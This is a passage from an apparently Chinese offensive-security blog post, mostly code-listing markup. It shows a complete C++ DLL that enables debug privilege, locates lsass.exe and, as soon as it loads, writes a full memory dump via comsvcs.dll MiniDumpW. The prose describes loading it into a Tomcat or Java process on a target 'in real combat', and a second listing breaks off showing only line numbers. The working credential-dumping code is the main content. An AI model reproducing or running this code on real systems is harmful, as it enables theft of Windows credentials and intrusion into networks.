</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// dllmain.cpp : 定义 DLL 应用程序的入口点。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;pch.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;DbgHelp.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;TlHelp32.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment( lib, &#34;Dbghelp.lib&#34; )
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>HRESULT</span>(WINAPI<span style=color:#f92672>*</span> _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>bool</span> <span style=color:#a6e22e>EnableDebugPrivilege</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    HANDLE hThis <span style=color:#f92672>=</span> GetCurrentProcess();
</span></span><span style=display:flex><span>    HANDLE hToken;
</span></span><span style=display:flex><span>    OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, <span style=color:#f92672>&amp;</span>hToken);
</span></span><span style=display:flex><span>    LUID luid;
</span></span><span style=display:flex><span>    LookupPrivilegeValue(<span style=color:#ae81ff>0</span>, TEXT(<span style=color:#e6db74>&#34;seDebugPrivilege&#34;</span>), <span style=color:#f92672>&amp;</span>luid);
</span></span><span style=display:flex><span>    TOKEN_PRIVILEGES priv;
</span></span><span style=display:flex><span>    priv.PrivilegeCount <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    priv.Privileges[<span style=color:#ae81ff>0</span>].Luid <span style=color:#f92672>=</span> luid;
</span></span><span style=display:flex><span>    priv.Privileges[<span style=color:#ae81ff>0</span>].Attributes <span style=color:#f92672>=</span> SE_PRIVILEGE_ENABLED;
</span></span><span style=display:flex><span>    AdjustTokenPrivileges(hToken, false, <span style=color:#f92672>&amp;</span>priv, <span style=color:#66d9ef>sizeof</span>(priv), <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    CloseHandle(hToken);
</span></span><span style=display:flex><span>    CloseHandle(hThis);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> true;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>Dump</span>() {
</span></span><span style=display:flex><span>    EnableDebugPrivilege();
</span></span><span style=display:flex><span>    WCHAR commandLine[MAX_PATH];
</span></span><span style=display:flex><span>    _MiniDumpW MiniDumpW;
</span></span><span style=display:flex><span>    DWORD lsassPID <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    HANDLE snapshot <span style=color:#f92672>=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    PROCESSENTRY32 processEntry <span style=color:#f92672>=</span> {};
</span></span><span style=display:flex><span>    processEntry.dwSize <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(PROCESSENTRY32);
</span></span><span style=display:flex><span>    LPCWSTR processName <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>//遍历lsass.exe 的PID
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (Process32First(snapshot, <span style=color:#f92672>&amp;</span>processEntry)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (_wcsicmp(processName, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;lsass.exe&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            Process32Next(snapshot, <span style=color:#f92672>&amp;</span>processEntry);
</span></span><span style=display:flex><span>            processName <span style=color:#f92672>=</span> processEntry.szExeFile;
</span></span><span style=display:flex><span>            lsassPID <span style=color:#f92672>=</span> processEntry.th32ProcessID;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    MiniDumpW <span style=color:#f92672>=</span> (_MiniDumpW)GetProcAddress(LoadLibrary(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;comsvcs.dll&#34;</span>), <span style=color:#e6db74>&#34;MiniDumpW&#34;</span>);
</span></span><span style=display:flex><span>    _itow(lsassPID, commandLine, <span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>    lstrcatW(commandLine, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34; C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>111.sql full&#34;</span>);
</span></span><span style=display:flex><span>    MiniDumpW(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, commandLine);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>( HMODULE hModule,
</span></span><span style=display:flex><span>                       DWORD  ul_reason_for_call,
</span></span><span style=display:flex><span>                       LPVOID lpReserved
</span></span><span style=display:flex><span>                     )
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (ul_reason_for_call)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>        Dump();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>编译成DLL文件发送过去后，我们可以看到Tomcat.exe或者Java.exe的Debug权限已经被开启：</p><p><img src=https://images.payloads.online/2022-08-11-22-06-46.png alt></p><p>在<code>C:\Windows\Temp</code>目录下已经生成进程的内存转储文件。</p><p><strong>注意：如果Tomcat是以SERVICE账户启动的，那么直接加载DLL会造成Tomcat直接崩溃无法工作，这些敏感操作的失败会引发系统的错误处理程序，最终导致Tomcat进程关闭，在实战中应根据业务的重要程度谨慎操作。</strong></p><p><img src=https://images.payloads.online/2022-08-11-22-07-05.png alt></p><p>为了避免类似的风险情况，我增加了权限判断、重复转储判断：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
